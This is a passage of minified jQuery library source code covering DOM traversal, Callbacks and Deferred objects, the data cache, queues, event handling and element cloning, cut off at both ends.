this.pushStack(n.unique(n.merge(this.get(),n(a,b))))},addBack:function(a){return this.add(null==a?this.prevObject:this.prevObject.filter(a))}});function E(a,b){do a=a[b];while(a&&1!==a.nodeType);return a}n.each({parent:function(a){var b=a.parentNode;return b&&11!==b.nodeType?b:null},parents:function(a){return n.dir(a,"parentNode")},parentsUntil:function(a,b,c){return n.dir(a,"parentNode",c)},next:function(a){return E(a,"nextSibling")},prev:function(a){return E(a,"previousSibling")},nextAll:function(a){return n.dir(a,"nextSibling")},prevAll:function(a){return n.dir(a,"previousSibling")},nextUntil:function(a,b,c){return n.dir(a,"nextSibling",c)},prevUntil:function(a,b,c){return n.dir(a,"previousSibling",c)},siblings:function(a){return n.sibling((a.parentNode||{}).firstChild,a)},children:function(a){return n.sibling(a.firstChild)},contents:function(a){return n.nodeName(a,"iframe")?a.contentDocument||a.contentWindow.document:n.merge([],a.childNodes)}},function(a,b){n.fn[a]=function(c,d){var e=n.map(this,b,c);return"Until"!==a.slice(-5)&&(d=c),d&&"string"==typeof d&&(e=n.filter(d,e)),this.length>1&&(D[a]||(e=n.unique(e)),C.test(a)&&(e=e.reverse())),this.pushStack(e)}});var F=/\S+/g,G={};function H(a){var b=G[a]={};return n.each(a.match(F)||[],function(a,c){b[c]=!0}),b}n.Callbacks=function(a){a="string"==typeof a?G[a]||H(a):n.extend({},a);var b,c,d,e,f,g,h=[],i=!a.once&&[],j=function(l){for(c=a.memory&&l,d=!0,f=g||0,g=0,e=h.length,b=!0;h&&e>f;f++)if(h[f].apply(l[0],l[1])===!1&&a.stopOnFalse){c=!1;break}b=!1,h&&(i?i.length&&j(i.shift()):c?h=[]:k.disable())},k={add:function(){if(h){var d=h.length;!function f(b){n.each(b,function(b,c){var d=n.type(c);"function"===d?a.unique&&k.has(c)||h.push(c):c&&c.length&&"string"!==d&&f(c)})}(arguments),b?e=h.length:c&&(g=d,j(c))}return this},remove:function(){return h&&n.each(arguments,function(a,c){var d;while((d=n.inArray(c,h,d))>-1)h.splice(d,1),b&&(e>=d&&e--,f>=d&&f--)}),this},has:function(a){return a?n.inArray(a,h)>-1:!(!h||!h.length)},empty:function(){return h=[],e=0,this},disable:function(){return h=i=c=void 0,this},disabled:function(){return!h},lock:function(){return i=void 0,c||k.disable(),this},locked:function(){return!i},fireWith:function(a,c){return!h||d&&!i||(c=c||[],c=[a,c.slice?c.slice():c],b?i.push(c):j(c)),this},fire:function(){return k.fireWith(this,arguments),this},fired:function(){return!!d}};return k},n.extend({Deferred:function(a){var b=[["resolve","done",n.Callbacks("once memory"),"resolved"],["reject","fail",n.Callbacks("once memory"),"rejected"],["notify","progress",n.Callbacks("memory")]],c="pending",d={state:function(){return c},always:function(){return e.done(arguments).fail(arguments),this},then:function(){var a=arguments;return n.Deferred(function(c){n.each(b,function(b,f){var g=n.isFunction(a[b])&&a[b];e[f[1]](function(){var a=g&&g.apply(this,arguments);a&&n.isFunction(a.promise)?a.promise().done(c.resolve).fail(c.reject).progress(c.notify):c[f[0]+"With"](this===d?c.promise():this,g?[a]:arguments)})}),a=null}).promise()},promise:function(a){return null!=a?n.extend(a,d):d}},e={};return d.pipe=d.then,n.each(b,function(a,f){var g=f[2],h=f[3];d[f[1]]=g.add,h&&g.add(function(){c=h},b[1^a][2].disable,b[2][2].lock),e[f[0]]=function(){return e[f[0]+"With"](this===e?d:this,arguments),this},e[f[0]+"With"]=g.fireWith}),d.promise(e),a&&a.call(e,e),e},when:function(a){var b=0,c=d.call(arguments),e=c.length,f=1!==e||a&&n.isFunction(a.promise)?e:0,g=1===f?a:n.Deferred(),h=function(a,b,c){return function(e){b[a]=this,c[a]=arguments.length>1?d.call(arguments):e,c===i?g.notifyWith(b,c):--f||g.resolveWith(b,c)}},i,j,k;if(e>1)for(i=new Array(e),j=new Array(e),k=new Array(e);e>b;b++)c[b]&&n.isFunction(c[b].promise)?c[b].promise().done(h(b,k,c)).fail(g.reject).progress(h(b,j,i)):--f;return f||g.resolveWith(k,c),g.promise()}});var I;n.fn.ready=function(a){return n.ready.promise().done(a),this},n.extend({isReady:!1,readyWait:1,holdReady:function(a){a?n.readyWait++:n.ready(!0)},ready:function(a){if(a===!0?!--n.readyWait:!n.isReady){if(!z.body)return setTimeout(n.ready);n.isReady=!0,a!==!0&&--n.readyWait>0||(I.resolveWith(z,[n]),n.fn.trigger&&n(z).trigger("ready").off("ready"))}}});function J(){z.addEventListener?(z.removeEventListener("DOMContentLoaded",K,!1),a.removeEventListener("load",K,!1)):(z.detachEvent("onreadystatechange",K),a.detachEvent("onload",K))}function K(){(z.addEventListener||"load"===event.type||"complete"===z.readyState)&&(J(),n.ready())}n.ready.promise=function(b){if(!I)if(I=n.Deferred(),"complete"===z.readyState)setTimeout(n.ready);else if(z.addEventListener)z.addEventListener("DOMContentLoaded",K,!1),a.addEventListener("load",K,!1);else{z.attachEvent("onreadystatechange",K),a.attachEvent("onload",K);var c=!1;try{c=null==a.frameElement&&z.documentElement}catch(d){}c&&c.doScroll&&!function e(){if(!n.isReady){try{c.doScroll("left")}catch(a){return setTimeout(e,50)}J(),n.ready()}}()}return I.promise(b)};var L="undefined",M;for(M in n(l))break;l.ownLast="0"!==M,l.inlineBlockNeedsLayout=!1,n(function(){var a,b,c=z.getElementsByTagName("body")[0];c&&(a=z.createElement("div"),a.style.cssText="border:0;width:0;height:0;position:absolute;top:0;left:-9999px;margin-top:1px",b=z.createElement("div"),c.appendChild(a).appendChild(b),typeof b.style.zoom!==L&&(b.style.cssText="border:0;margin:0;width:1px;padding:1px;display:inline;zoom:1",(l.inlineBlockNeedsLayout=3===b.offsetWidth)&&(c.style.zoom=1)),c.removeChild(a),a=b=null)}),function(){var a=z.createElement("div");if(null==l.deleteExpando){l.deleteExpando=!0;try{delete a.test}catch(b){l.deleteExpando=!1}}a=null}(),n.acceptData=function(a){var b=n.noData[(a.nodeName+" ").toLowerCase()],c=+a.nodeType||1;return 1!==c&&9!==c?!1:!b||b!==!0&&a.getAttribute("classid")===b};var N=/^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,O=/([A-Z])/g;function P(a,b,c){if(void 0===c&&1===a.nodeType){var d="data-"+b.replace(O,"-$1").toLowerCase();if(c=a.getAttribute(d),"string"==typeof c){try{c="true"===c?!0:"false"===c?!1:"null"===c?null:+c+""===c?+c:N.test(c)?n.parseJSON(c):c}catch(e){}n.data(a,b,c)}else c=void 0}return c}function Q(a){var b;for(b in a)if(("data"!==b||!n.isEmptyObject(a[b]))&&"toJSON"!==b)return!1;return!0}function R(a,b,d,e){if(n.acceptData(a)){var f,g,h=n.expando,i=a.nodeType,j=i?n.cache:a,k=i?a[h]:a[h]&&h;if(k&&j[k]&&(e||j[k].data)||void 0!==d||"string"!=typeof b)return k||(k=i?a[h]=c.pop()||n.guid++:h),j[k]||(j[k]=i?{}:{toJSON:n.noop}),("object"==typeof b||"function"==typeof b)&&(e?j[k]=n.extend(j[k],b):j[k].data=n.extend(j[k].data,b)),g=j[k],e||(g.data||(g.data={}),g=g.data),void 0!==d&&(g[n.camelCase(b)]=d),"string"==typeof b?(f=g[b],null==f&&(f=g[n.camelCase(b)])):f=g,f
}}function S(a,b,c){if(n.acceptData(a)){var d,e,f=a.nodeType,g=f?n.cache:a,h=f?a[n.expando]:n.expando;if(g[h]){if(b&&(d=c?g[h]:g[h].data)){n.isArray(b)?b=b.concat(n.map(b,n.camelCase)):b in d?b=[b]:(b=n.camelCase(b),b=b in d?[b]:b.split(" ")),e=b.length;while(e--)delete d[b[e]];if(c?!Q(d):!n.isEmptyObject(d))return}(c||(delete g[h].data,Q(g[h])))&&(f?n.cleanData([a],!0):l.deleteExpando||g!=g.window?delete g[h]:g[h]=null)}}}n.extend({cache:{},noData:{"applet ":!0,"embed ":!0,"object ":"clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"},hasData:function(a){return a=a.nodeType?n.cache[a[n.expando]]:a[n.expando],!!a&&!Q(a)},data:function(a,b,c){return R(a,b,c)},removeData:function(a,b){return S(a,b)},_data:function(a,b,c){return R(a,b,c,!0)},_removeData:function(a,b){return S(a,b,!0)}}),n.fn.extend({data:function(a,b){var c,d,e,f=this[0],g=f&&f.attributes;if(void 0===a){if(this.length&&(e=n.data(f),1===f.nodeType&&!n._data(f,"parsedAttrs"))){c=g.length;while(c--)d=g[c].name,0===d.indexOf("data-")&&(d=n.camelCase(d.slice(5)),P(f,d,e[d]));n._data(f,"parsedAttrs",!0)}return e}return"object"==typeof a?this.each(function(){n.data(this,a)}):arguments.length>1?this.each(function(){n.data(this,a,b)}):f?P(f,a,n.data(f,a)):void 0},removeData:function(a){return this.each(function(){n.removeData(this,a)})}}),n.extend({queue:function(a,b,c){var d;return a?(b=(b||"fx")+"queue",d=n._data(a,b),c&&(!d||n.isArray(c)?d=n._data(a,b,n.makeArray(c)):d.push(c)),d||[]):void 0},dequeue:function(a,b){b=b||"fx";var c=n.queue(a,b),d=c.length,e=c.shift(),f=n._queueHooks(a,b),g=function(){n.dequeue(a,b)};"inprogress"===e&&(e=c.shift(),d--),e&&("fx"===b&&c.unshift("inprogress"),delete f.stop,e.call(a,g,f)),!d&&f&&f.empty.fire()},_queueHooks:function(a,b){var c=b+"queueHooks";return n._data(a,c)||n._data(a,c,{empty:n.Callbacks("once memory").add(function(){n._removeData(a,b+"queue"),n._removeData(a,c)})})}}),n.fn.extend({queue:function(a,b){var c=2;return"string"!=typeof a&&(b=a,a="fx",c--),arguments.length<c?n.queue(this[0],a):void 0===b?this:this.each(function(){var c=n.queue(this,a,b);n._queueHooks(this,a),"fx"===a&&"inprogress"!==c[0]&&n.dequeue(this,a)})},dequeue:function(a){return this.each(function(){n.dequeue(this,a)})},clearQueue:function(a){return this.queue(a||"fx",[])},promise:function(a,b){var c,d=1,e=n.Deferred(),f=this,g=this.length,h=function(){--d||e.resolveWith(f,[f])};"string"!=typeof a&&(b=a,a=void 0),a=a||"fx";while(g--)c=n._data(f[g],a+"queueHooks"),c&&c.empty&&(d++,c.empty.add(h));return h(),e.promise(b)}});var T=/[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,U=["Top","Right","Bottom","Left"],V=function(a,b){return a=b||a,"none"===n.css(a,"display")||!n.contains(a.ownerDocument,a)},W=n.access=function(a,b,c,d,e,f,g){var h=0,i=a.length,j=null==c;if("object"===n.type(c)){e=!0;for(h in c)n.access(a,b,h,c[h],!0,f,g)}else if(void 0!==d&&(e=!0,n.isFunction(d)||(g=!0),j&&(g?(b.call(a,d),b=null):(j=b,b=function(a,b,c){return j.call(n(a),c)})),b))for(;i>h;h++)b(a[h],c,g?d:d.call(a[h],h,b(a[h],c)));return e?a:j?b.call(a):i?b(a[0],c):f},X=/^(?:checkbox|radio)$/i;!function(){var a=z.createDocumentFragment(),b=z.createElement("div"),c=z.createElement("input");if(b.setAttribute("className","t"),b.innerHTML="  <link/><table></table><a href='/a'>a</a>",l.leadingWhitespace=3===b.firstChild.nodeType,l.tbody=!b.getElementsByTagName("tbody").length,l.htmlSerialize=!!b.getElementsByTagName("link").length,l.html5Clone="<:nav></:nav>"!==z.createElement("nav").cloneNode(!0).outerHTML,c.type="checkbox",c.checked=!0,a.appendChild(c),l.appendChecked=c.checked,b.innerHTML="<textarea>x</textarea>",l.noCloneChecked=!!b.cloneNode(!0).lastChild.defaultValue,a.appendChild(b),b.innerHTML="<input type='radio' checked='checked' name='t'/>",l.checkClone=b.cloneNode(!0).cloneNode(!0).lastChild.checked,l.noCloneEvent=!0,b.attachEvent&&(b.attachEvent("onclick",function(){l.noCloneEvent=!1}),b.cloneNode(!0).click()),null==l.deleteExpando){l.deleteExpando=!0;try{delete b.test}catch(d){l.deleteExpando=!1}}a=b=c=null}(),function(){var b,c,d=z.createElement("div");for(b in{submit:!0,change:!0,focusin:!0})c="on"+b,(l[b+"Bubbles"]=c in a)||(d.setAttribute(c,"t"),l[b+"Bubbles"]=d.attributes[c].expando===!1);d=null}();var Y=/^(?:input|select|textarea)$/i,Z=/^key/,$=/^(?:mouse|contextmenu)|click/,_=/^(?:focusinfocus|focusoutblur)$/,ab=/^([^.]*)(?:\.(.+)|)$/;function bb(){return!0}function cb(){return!1}function db(){try{return z.activeElement}catch(a){}}n.event={global:{},add:function(a,b,c,d,e){var f,g,h,i,j,k,l,m,o,p,q,r=n._data(a);if(r){c.handler&&(i=c,c=i.handler,e=i.selector),c.guid||(c.guid=n.guid++),(g=r.events)||(g=r.events={}),(k=r.handle)||(k=r.handle=function(a){return typeof n===L||a&&n.event.triggered===a.type?void 0:n.event.dispatch.apply(k.elem,arguments)},k.elem=a),b=(b||"").match(F)||[""],h=b.length;while(h--)f=ab.exec(b[h])||[],o=q=f[1],p=(f[2]||"").split(".").sort(),o&&(j=n.event.special[o]||{},o=(e?j.delegateType:j.bindType)||o,j=n.event.special[o]||{},l=n.extend({type:o,origType:q,data:d,handler:c,guid:c.guid,selector:e,needsContext:e&&n.expr.match.needsContext.test(e),namespace:p.join(".")},i),(m=g[o])||(m=g[o]=[],m.delegateCount=0,j.setup&&j.setup.call(a,d,p,k)!==!1||(a.addEventListener?a.addEventListener(o,k,!1):a.attachEvent&&a.attachEvent("on"+o,k))),j.add&&(j.add.call(a,l),l.handler.guid||(l.handler.guid=c.guid)),e?m.splice(m.delegateCount++,0,l):m.push(l),n.event.global[o]=!0);a=null}},remove:function(a,b,c,d,e){var f,g,h,i,j,k,l,m,o,p,q,r=n.hasData(a)&&n._data(a);if(r&&(k=r.events)){b=(b||"").match(F)||[""],j=b.length;while(j--)if(h=ab.exec(b[j])||[],o=q=h[1],p=(h[2]||"").split(".").sort(),o){l=n.event.special[o]||{},o=(d?l.delegateType:l.bindType)||o,m=k[o]||[],h=h[2]&&new RegExp("(^|\\.)"+p.join("\\.(?:.*\\.|)")+"(\\.|$)"),i=f=m.length;while(f--)g=m[f],!e&&q!==g.origType||c&&c.guid!==g.guid||h&&!h.test(g.namespace)||d&&d!==g.selector&&("**"!==d||!g.selector)||(m.splice(f,1),g.selector&&m.delegateCount--,l.remove&&l.remove.call(a,g));i&&!m.length&&(l.teardown&&l.teardown.call(a,p,r.handle)!==!1||n.removeEvent(a,o,r.handle),delete k[o])}else for(o in k)n.event.remove(a,o+b[j],c,d,!0);n.isEmptyObject(k)&&(delete r.handle,n._removeData(a,"events"))}},trigger:function(b,c,d,e){var f,g,h,i,k,l,m,o=[d||z],p=j.call(b,"type")?b.type:b,q=j.call(b,"namespace")?b.namespace.split("."):[];if(h=l=d=d||z,3!==d.nodeType&&8!==d.nodeType&&!_.test(p+n.event.triggered)&&(p.indexOf(".")>=0&&(q=p.split("."),p=q.shift(),q.sort()),g=p.indexOf(":")<0&&"on"+p,b=b[n.expando]?b:new n.Event(p,"object"==typeof b&&b),b.isTrigger=e?2:3,b.namespace=q.join("."),b.namespace_re=b.namespace?new RegExp("(^|\\.)"+q.join("\\.(?:.*\\.|)")+"(\\.|$)"):null,b.result=void 0,b.target||(b.target=d),c=null==c?[b]:n.makeArray(c,[b]),k=n.event.special[p]||{},e||!k.trigger||k.trigger.apply(d,c)!==!1)){if(!e&&!k.noBubble&&!n.isWindow(d)){for(i=k.delegateType||p,_.test(i+p)||(h=h.parentNode);h;h=h.parentNode)o.push(h),l=h;l===(d.ownerDocument||z)&&o.push(l.defaultView||l.parentWindow||a)}m=0;while((h=o[m++])&&!b.isPropagationStopped())b.type=m>1?i:k.bindType||p,f=(n._data(h,"events")||{})[b.type]&&n._data(h,"handle"),f&&f.apply(h,c),f=g&&h[g],f&&f.apply&&n.acceptData(h)&&(b.result=f.apply(h,c),b.result===!1&&b.preventDefault());if(b.type=p,!e&&!b.isDefaultPrevented()&&(!k._default||k._default.apply(o.pop(),c)===!1)&&n.acceptData(d)&&g&&d[p]&&!n.isWindow(d)){l=d[g],l&&(d[g]=null),n.event.triggered=p;try{d[p]()}catch(r){}n.event.triggered=void 0,l&&(d[g]=l)}return b.result}},dispatch:function(a){a=n.event.fix(a);var b,c,e,f,g,h=[],i=d.call(arguments),j=(n._data(this,"events")||{})[a.type]||[],k=n.event.special[a.type]||{};if(i[0]=a,a.delegateTarget=this,!k.preDispatch||k.preDispatch.call(this,a)!==!1){h=n.event.handlers.call(this,a,j),b=0;while((f=h[b++])&&!a.isPropagationStopped()){a.currentTarget=f.elem,g=0;while((e=f.handlers[g++])&&!a.isImmediatePropagationStopped())(!a.namespace_re||a.namespace_re.test(e.namespace))&&(a.handleObj=e,a.data=e.data,c=((n.event.special[e.origType]||{}).handle||e.handler).apply(f.elem,i),void 0!==c&&(a.result=c)===!1&&(a.preventDefault(),a.stopPropagation()))}return k.postDispatch&&k.postDispatch.call(this,a),a.result}},handlers:function(a,b){var c,d,e,f,g=[],h=b.delegateCount,i=a.target;if(h&&i.nodeType&&(!a.button||"click"!==a.type))for(;i!=this;i=i.parentNode||this)if(1===i.nodeType&&(i.disabled!==!0||"click"!==a.type)){for(e=[],f=0;h>f;f++)d=b[f],c=d.selector+" ",void 0===e[c]&&(e[c]=d.needsContext?n(c,this).index(i)>=0:n.find(c,this,null,[i]).length),e[c]&&e.push(d);e.length&&g.push({elem:i,handlers:e})}return h<b.length&&g.push({elem:this,handlers:b.slice(h)}),g},fix:function(a){if(a[n.expando])return a;var b,c,d,e=a.type,f=a,g=this.fixHooks[e];g||(this.fixHooks[e]=g=$.test(e)?this.mouseHooks:Z.test(e)?this.keyHooks:{}),d=g.props?this.props.concat(g.props):this.props,a=new n.Event(f),b=d.length;while(b--)c=d[b],a[c]=f[c];return a.target||(a.target=f.srcElement||z),3===a.target.nodeType&&(a.target=a.target.parentNode),a.metaKey=!!a.metaKey,g.filter?g.filter(a,f):a},props:"altKey bubbles cancelable ctrlKey currentTarget eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),fixHooks:{},keyHooks:{props:"char charCode key keyCode".split(" "),filter:function(a,b){return null==a.which&&(a.which=null!=b.charCode?b.charCode:b.keyCode),a}},mouseHooks:{props:"button buttons clientX clientY fromElement offsetX offsetY pageX pageY screenX screenY toElement".split(" "),filter:function(a,b){var c,d,e,f=b.button,g=b.fromElement;return null==a.pageX&&null!=b.clientX&&(d=a.target.ownerDocument||z,e=d.documentElement,c=d.body,a.pageX=b.clientX+(e&&e.scrollLeft||c&&c.scrollLeft||0)-(e&&e.clientLeft||c&&c.clientLeft||0),a.pageY=b.clientY+(e&&e.scrollTop||c&&c.scrollTop||0)-(e&&e.clientTop||c&&c.clientTop||0)),!a.relatedTarget&&g&&(a.relatedTarget=g===a.target?b.toElement:g),a.which||void 0===f||(a.which=1&f?1:2&f?3:4&f?2:0),a}},special:{load:{noBubble:!0},focus:{trigger:function(){if(this!==db()&&this.focus)try{return this.focus(),!1}catch(a){}},delegateType:"focusin"},blur:{trigger:function(){return this===db()&&this.blur?(this.blur(),!1):void 0},delegateType:"focusout"},click:{trigger:function(){return n.nodeName(this,"input")&&"checkbox"===this.type&&this.click?(this.click(),!1):void 0},_default:function(a){return n.nodeName(a.target,"a")}},beforeunload:{postDispatch:function(a){void 0!==a.result&&(a.originalEvent.returnValue=a.result)}}},simulate:function(a,b,c,d){var e=n.extend(new n.Event,c,{type:a,isSimulated:!0,originalEvent:{}});d?n.event.trigger(e,null,b):n.event.dispatch.call(b,e),e.isDefaultPrevented()&&c.preventDefault()}},n.removeEvent=z.removeEventListener?function(a,b,c){a.removeEventListener&&a.removeEventListener(b,c,!1)}:function(a,b,c){var d="on"+b;a.detachEvent&&(typeof a[d]===L&&(a[d]=null),a.detachEvent(d,c))},n.Event=function(a,b){return this instanceof n.Event?(a&&a.type?(this.originalEvent=a,this.type=a.type,this.isDefaultPrevented=a.defaultPrevented||void 0===a.defaultPrevented&&(a.returnValue===!1||a.getPreventDefault&&a.getPreventDefault())?bb:cb):this.type=a,b&&n.extend(this,b),this.timeStamp=a&&a.timeStamp||n.now(),void(this[n.expando]=!0)):new n.Event(a,b)},n.Event.prototype={isDefaultPrevented:cb,isPropagationStopped:cb,isImmediatePropagationStopped:cb,preventDefault:function(){var a=this.originalEvent;this.isDefaultPrevented=bb,a&&(a.preventDefault?a.preventDefault():a.returnValue=!1)},stopPropagation:function(){var a=this.originalEvent;this.isPropagationStopped=bb,a&&(a.stopPropagation&&a.stopPropagation(),a.cancelBubble=!0)},stopImmediatePropagation:function(){this.isImmediatePropagationStopped=bb,this.stopPropagation()}},n.each({mouseenter:"mouseover",mouseleave:"mouseout"},function(a,b){n.event.special[a]={delegateType:b,bindType:b,handle:function(a){var c,d=this,e=a.relatedTarget,f=a.handleObj;return(!e||e!==d&&!n.contains(d,e))&&(a.type=f.origType,c=f.handler.apply(this,arguments),a.type=b),c}}}),l.submitBubbles||(n.event.special.submit={setup:function(){return n.nodeName(this,"form")?!1:void n.event.add(this,"click._submit keypress._submit",function(a){var b=a.target,c=n.nodeName(b,"input")||n.nodeName(b,"button")?b.form:void 0;c&&!n._data(c,"submitBubbles")&&(n.event.add(c,"submit._submit",function(a){a._submit_bubble=!0}),n._data(c,"submitBubbles",!0))})},postDispatch:function(a){a._submit_bubble&&(delete a._submit_bubble,this.parentNode&&!a.isTrigger&&n.event.simulate("submit",this.parentNode,a,!0))},teardown:function(){return n.nodeName(this,"form")?!1:void n.event.remove(this,"._submit")}}),l.changeBubbles||(n.event.special.change={setup:function(){return Y.test(this.nodeName)?(("checkbox"===this.type||"radio"===this.type)&&(n.event.add(this,"propertychange._change",function(a){"checked"===a.originalEvent.propertyName&&(this._just_changed=!0)}),n.event.add(this,"click._change",function(a){this._just_changed&&!a.isTrigger&&(this._just_changed=!1),n.event.simulate("change",this,a,!0)})),!1):void n.event.add(this,"beforeactivate._change",function(a){var b=a.target;Y.test(b.nodeName)&&!n._data(b,"changeBubbles")&&(n.event.add(b,"change._change",function(a){!this.parentNode||a.isSimulated||a.isTrigger||n.event.simulate("change",this.parentNode,a,!0)}),n._data(b,"changeBubbles",!0))})},handle:function(a){var b=a.target;return this!==b||a.isSimulated||a.isTrigger||"radio"!==b.type&&"checkbox"!==b.type?a.handleObj.handler.apply(this,arguments):void 0},teardown:function(){return n.event.remove(this,"._change"),!Y.test(this.nodeName)}}),l.focusinBubbles||n.each({focus:"focusin",blur:"focusout"},function(a,b){var c=function(a){n.event.simulate(b,a.target,n.event.fix(a),!0)};n.event.special[b]={setup:function(){var d=this.ownerDocument||this,e=n._data(d,b);e||d.addEventListener(a,c,!0),n._data(d,b,(e||0)+1)},teardown:function(){var d=this.ownerDocument||this,e=n._data(d,b)-1;e?n._data(d,b,e):(d.removeEventListener(a,c,!0),n._removeData(d,b))}}}),n.fn.extend({on:function(a,b,c,d,e){var f,g;if("object"==typeof a){"string"!=typeof b&&(c=c||b,b=void 0);for(f in a)this.on(f,b,c,a[f],e);return this}if(null==c&&null==d?(d=b,c=b=void 0):null==d&&("string"==typeof b?(d=c,c=void 0):(d=c,c=b,b=void 0)),d===!1)d=cb;else if(!d)return this;return 1===e&&(g=d,d=function(a){return n().off(a),g.apply(this,arguments)},d.guid=g.guid||(g.guid=n.guid++)),this.each(function(){n.event.add(this,a,d,c,b)})},one:function(a,b,c,d){return this.on(a,b,c,d,1)},off:function(a,b,c){var d,e;if(a&&a.preventDefault&&a.handleObj)return d=a.handleObj,n(a.delegateTarget).off(d.namespace?d.origType+"."+d.namespace:d.origType,d.selector,d.handler),this;if("object"==typeof a){for(e in a)this.off(e,b,a[e]);return this}return(b===!1||"function"==typeof b)&&(c=b,b=void 0),c===!1&&(c=cb),this.each(function(){n.event.remove(this,a,c,b)})},trigger:function(a,b){return this.each(function(){n.event.trigger(a,b,this)})},triggerHandler:function(a,b){var c=this[0];return c?n.event.trigger(a,b,c,!0):void 0}});function eb(a){var b=fb.split("|"),c=a.createDocumentFragment();if(c.createElement)while(b.length)c.createElement(b.pop());return c}var fb="abbr|article|aside|audio|bdi|canvas|data|datalist|details|figcaption|figure|footer|header|hgroup|mark|meter|nav|output|progress|section|summary|time|video",gb=/ jQuery\d+="(?:null|\d+)"/g,hb=new RegExp("<(?:"+fb+")[\\s/>]","i"),ib=/^\s+/,jb=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi,kb=/<([\w:]+)/,lb=/<tbody/i,mb=/<|&#?\w+;/,nb=/<(?:script|style|link)/i,ob=/checked\s*(?:[^=]|=\s*.checked.)/i,pb=/^$|\/(?:java|ecma)script/i,qb=/^true\/(.*)/,rb=/^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g,sb={option:[1,"<select multiple='multiple'>","</select>"],legend:[1,"<fieldset>","</fieldset>"],area:[1,"<map>","</map>"],param:[1,"<object>","</object>"],thead:[1,"<table>","</table>"],tr:[2,"<table><tbody>","</tbody></table>"],col:[2,"<table><tbody></tbody><colgroup>","</colgroup></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],_default:l.htmlSerialize?[0,"",""]:[1,"X<div>","</div>"]},tb=eb(z),ub=tb.appendChild(z.createElement("div"));sb.optgroup=sb.option,sb.tbody=sb.tfoot=sb.colgroup=sb.caption=sb.thead,sb.th=sb.td;function vb(a,b){var c,d,e=0,f=typeof a.getElementsByTagName!==L?a.getElementsByTagName(b||"*"):typeof a.querySelectorAll!==L?a.querySelectorAll(b||"*"):void 0;if(!f)for(f=[],c=a.childNodes||a;null!=(d=c[e]);e++)!b||n.nodeName(d,b)?f.push(d):n.merge(f,vb(d,b));return void 0===b||b&&n.nodeName(a,b)?n.merge([a],f):f}function wb(a){X.test(a.type)&&(a.defaultChecked=a.checked)}function xb(a,b){return n.nodeName(a,"table")&&n.nodeName(11!==b.nodeType?b:b.firstChild,"tr")?a.getElementsByTagName("tbody")[0]||a.appendChild(a.ownerDocument.createElement("tbody")):a}function yb(a){return a.type=(null!==n.find.attr(a,"type"))+"/"+a.type,a}function zb(a){var b=qb.exec(a.type);return b?a.type=b[1]:a.removeAttribute("type"),a}function Ab(a,b){for(var c,d=0;null!=(c=a[d]);d++)n._data(c,"globalEval",!b||n._data(b[d],"globalEval"))}function Bb(a,b){if(1===b.nodeType&&n.hasData(a)){var c,d,e,f=n._data(a),g=n._data(b,f),h=f.events;if(h){delete g.handle,g.events={};for(c in h)for(d=0,e=h[c].length;e>d;d++)n.event.add(b,c,h[c][d])}g.data&&(g.data=n.extend({},g.data))}}function Cb(a,b){var c,d,e;if(1===b.nodeType){if(c=b.nodeName.toLowerCase(),!l.noCloneEvent&&b[n.expando]){e=n._data(b);for(d in e.events)n.removeEvent(b,d,e.handle);b.removeAttribute(n.expando)}"script"===c&&b.text!==a.text?(yb(b).text=a.text,zb(b)):"object"===c?(b.parentNode&&(b.outerHTML=a.outerHTML),l.html5Clone&&a.innerHTML&&!n.trim(b.innerHTML)&&(b.innerHTML=a.innerHTML)):"input"===c&&X.test(a.type)?(b.defaultChecked=b.checked=a.checked,b.value!==a.value&&(b.value=a.value)):"option"===c?b.defaultSelected=b.selected=a.defaultSelected:("input"===c||"textarea"===c)&&(b.defaultValue=a.defaultValue)}}n.extend({clone:function(a,b,c){var d,e,f,g,h,i=n.contains(a.ownerDocument,a);if(l.html5Clone||n.isXMLDoc(a)||!hb.test("<"+a.nodeName+">")?f=a.cloneNode(!0):(ub.innerHTML=a.outerHTML,ub.removeChild(f=ub.firstChild)),!(l.noCloneEvent&&l.noCloneChecked||1!==a.nodeType&&11!==a.nodeType||n.isXMLDoc(a)))for(d=vb(f),h=vb(a),g=0;null!=(e=h[g]);++g)d[g]&&Cb(e,d[g]);if(b)if(c)for(h=h||vb(a),d=d||vb(f),g=0;null!=(e=h[g]);g++)Bb(e,d[g]);else Bb(a,f);return d=vb(f,"script"),d.length>0&&Ab(d,!i&&vb(a,"script")),d=h=e=null,f},buildFragment:function(a,b,c,d){for(var e,f,g,h,i,j,k,m=a.length,o=eb(b),p=[],q=0;m>q;q++)if(f=a[q],f||0===f)if("object"===n.type(f))n.merge(p,f.nodeType?[f]:f);else if(mb.test(f)){h=h||o.appendChild(b.createElement("div")),i=(kb.exec(f)||["",""])[1].toLowerCase(),k=sb[i]||sb._default,h.innerHTML=k[1]+f.replace(jb,"<$1><$2>")+k[2],e=k[0];while(e--)h=h.lastChild;if(!l.leadingWhitespace&&ib.test(f)&&p.push(b.createTextNode(ib.exec(f)[0])),!l.tbody){f="table"!==i||lb.test(f)?"<table>"!==k[1]||lb.test(f)?0:h:h.firstChild,e=f&&f.childNodes.length;while(e--)n.nodeName(j=f.childNodes[e],"tbody")&&!j.childNodes.length&&f.removeChild(j)}n.merge(p,h.childNodes),h.textContent="";while(h.firstChild)h.removeChild(h.firstChild);h=o.lastChild}else p.push(b.createTextNode(f));h&&o.removeChild(h),l.appendChecked||n.grep(vb(p,"input"),wb),q=0;while(f=p[q++])if((!d||-1===n.inArray(f,d))&&(g=n.contains(f.ownerDocument,f),h=vb(o.appendChild(f),"script"),g&&Ab(h),c)){e=0;while(f=h[e++])pb.test(f.type||"")&&c.push(f)}return h=null,o},cleanData:function(a,b){for(var d,e,f,g,h=0,i=n.expando,j=n.cache,k=l.deleteExpando,m=n.event.special;null!=(d=a[h]);h++)if((b||n.acceptData(d))&&(f=d[i],g=f&&j[f])){if(g.events)for(e in g.events)m[e]?n.event.remove(d,e):n.removeEvent(d,e,g.handle);j[f]&&(delete j[f],k?delete d[i]:typeof d.removeAttribute!==L?d.removeAttribute(i):d[i]=null,c.push(f))}}}),n.fn.extend({text:function(a){return W(this,function(a){return void 0===a?n.text(this):this.empty().append((this[0]&&this[0].ownerDocument||z).createTextNode(a))},null,a,arguments.length)},append:function(){return this.domManip(arguments,function(a){if(1===this.nodeType||11===this.nodeType||9===this.nodeType){var 